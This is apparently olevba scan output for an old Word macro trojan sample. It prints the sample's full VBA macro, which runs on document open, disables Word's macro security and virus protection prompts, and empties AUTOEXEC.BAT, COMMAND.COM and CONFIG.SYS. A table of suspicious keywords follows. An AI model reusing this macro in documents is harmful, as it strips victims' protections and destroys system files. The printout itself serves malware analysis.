olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.DisableSecurity-3fd2c1edc6dc2347f0217cb83a7c051e07276df3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.DisableSecurity-3fd2c1edc6dc2347f0217cb83a7c051e07276df3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Euh...Flush?
' Yep, coded by Super Grovert!

Private Sub Document_Open()

On Error Resume Next
If System.PrivateProfileString("",
"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <>
"" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("",
"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") =
1
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1):
Options.SaveNormalPrompt = (1 - 1)
End If

SetAttr "C:\AUTOEXEC.BAT", 0 ' Let's flush Autoexec.bat
  Open "C:\AUTOEXEC.BAT" For Output As #1
Close #1

SetAttr "C:\COMMAND.COM", 0 ' Let's flush Command.com
  Open "C:\COMMAND.COM" For Output As #1
Close #1

SetAttr "C:\CONFIG.SYS", 0 ' Let's flush Config.sys
  Open "C:\CONFIG.SYS" For Output As #1
Close #1

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

